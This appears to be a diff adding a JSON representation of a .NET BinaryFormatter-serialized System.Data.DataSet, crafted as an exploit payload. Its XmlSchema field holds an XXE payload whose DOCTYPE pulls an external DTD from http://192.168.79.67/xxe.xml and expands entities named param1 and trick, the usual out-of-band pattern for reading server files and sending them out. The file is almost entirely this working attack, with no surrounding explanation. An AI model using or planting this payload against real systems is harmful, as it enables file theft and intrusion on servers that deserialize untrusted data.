@@ -1,0 +1,150 @@
+{
+    "0": [
+        "SerializedStreamHeader",
+        {
+            "HeaderId": 4294967295,
+            "MajorVersion": 1,
+            "MinorVersion": 0,
+            "RootId": 1
+        }
+    ],
+    "1": [
+        "BinaryLibrary",
+        {
+            "LibraryId": 2,
+            "LibraryName": "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    ],
+    "2": [
+        "ClassWithMembersAndTypes",
+        {
+            "ClassInfo": {
+                "MemberCount": 3,
+                "MemberNames": [
+                    "DataSet.RemotingVersion",
+                    "XmlSchema",
+                    "XmlDiffGram"
+                ],
+                "Name": "System.Data.DataSet",
+                "ObjectId": 1
+            },
+            "LibraryId": 2,
+            "MemberTypeInfo": {
+                "AdditionalInfos": [
+                    [
+                        "SystemClass",
+                        "System.Version"
+                    ],
+                    [
+                        "String",
+                        null
+                    ],
+                    [
+                        "String",
+                        null
+                    ]
+                ],
+                "BinaryTypeEnums": [
+                    "SystemClass",
+                    "String",
+                    "String"
+                ]
+            },
+            "Values": [
+                [
+                    "DataSet.RemotingVersion : SystemClass",
+                    [
+                        "MemberReference",
+                        {
+                            "IdRef": 3
+                        }
+                    ]
+                ],
+                [
+                    "XmlSchema : String",
+                    [
+                        "BinaryObjectString",
+                        {
+                            "ObjectId": 4,
+                            "Value": "<?xml version=\"1.0\" encoding=\"utf-16\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://192.168.79.67/xxe.xml\" > %remote; %param1; %trick; ]>\r\n<xs:schema id=\"NewDataSet\" xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">\r\n  <xs:element name=\"NewDataSet\" msdata:IsDataSet=\"true\" msdata:UseCurrentLocale=\"true\">\r\n    <xs:complexType>\r\n      <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\" />\r\n    </xs:complexType>\r\n  </xs:element>\r\n</xs:schema>"
+                        }
+                    ]
+                ],
+                [
+                    "XmlDiffGram : String",
+                    [
+                        "BinaryObjectString",
+                        {
+                            "ObjectId": 5,
+                            "Value": "<diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\" />"
+                        }
+                    ]
+                ]
+            ]
+        }
+    ],
+    "3": [
+        "SystemClassWithMembersAndTypes",
+        {
+            "ClassInfo": {
+                "MemberCount": 4,
+                "MemberNames": [
+                    "_Major",
+                    "_Minor",
+                    "_Build",
+                    "_Revision"
+                ],
+                "Name": "System.Version",
+                "ObjectId": 3
+            },
+            "MemberTypeInfo": {
+                "AdditionalInfos": [
+                    [
+                        "Primitive",
+                        "Int32"
+                    ],
+                    [
+                        "Primitive",
+                        "Int32"
+                    ],
+                    [
+                        "Primitive",
+                        "Int32"
+                    ],
+                    [
+                        "Primitive",
+                        "Int32"
+                    ]
+                ],
+                "BinaryTypeEnums": [
+                    "Primitive",
+                    "Primitive",
+                    "Primitive",
+                    "Primitive"
+                ]
+            },
+            "Values": [
+                [
+                    "_Major : Primitive",
+                    2
+                ],
+                [
+                    "_Minor : Primitive",
+                    0
+                ],
+                [
+                    "_Build : Primitive",
+                    -1
+                ],
+                [
+                    "_Revision : Primitive",
+                    -1
+                ]
+            ]
+        }
+    ],
+    "4": [
+        "MessageEnd",
+        null
+    ]
+}
